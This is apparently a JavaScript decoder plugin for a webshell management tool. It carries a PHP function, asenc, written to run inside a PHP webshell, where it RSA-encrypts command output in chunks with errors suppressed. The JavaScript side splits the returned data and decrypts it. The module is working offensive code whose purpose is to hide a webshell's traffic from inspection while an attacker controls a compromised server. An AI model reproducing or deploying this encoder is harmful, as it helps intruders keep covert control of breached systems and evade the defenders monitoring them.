/**
 * php::rsa解码器
 * Create at: 2023/06/29 20:50:57
 */

'use strict';

module.exports = {
  /**
   * @returns {string} asenc 将返回数据base64编码
   * 自定义输出函数名称必须为 asenc
   * 该函数使用的语法需要和shell保持一致
   */
  asoutput: () => {
    return `function asenc($out){
    global $pk;
$pk = @openssl_pkey_get_public($pk);
$n = @round(@strlen($out) / 80);
$l = @round(@strlen($out) / $n);
    $r = [];
    for ($i = 0; $n > $i; $i++) {
      @openssl_public_encrypt(substr($out,$i * $l, $l),$de,$pk,OPENSSL_PKCS1_OAEP_PADDING);
      @array_push($r,@base64_encode($de));
    };
    return @join("|",$r);
    }
    `.replace(/\n\s+/g, '');
  },
  /**
   * 解码 Buffer
   * @param {string} data 要被解码的 Buffer
   * @returns {string} 解码后的 Buffer
   */
  decode_buff: (data, ext={}) => {
    let r=[];
    //console.log(data.toString());
    data.toString().split("|").forEach(
      piece=>{
        //console.log(piece);
        //console.log(ext['rsa'].decrypt(piece).toString());
        r.push(ext['rsa'].decrypt(piece).toString());
      }
    );
//console.log(r);
    return Buffer.from(r.join(""));
  }
}
